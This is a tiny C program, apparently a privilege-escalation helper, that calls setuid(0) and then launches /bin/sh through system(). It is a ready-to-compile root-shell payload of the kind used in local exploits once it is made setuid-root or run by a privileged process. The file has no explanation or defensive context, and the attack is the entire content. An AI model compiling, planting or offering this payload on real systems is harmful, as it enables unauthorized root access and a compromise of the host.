#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
void main()
{
	setuid(0);
	system("/bin/sh");
}

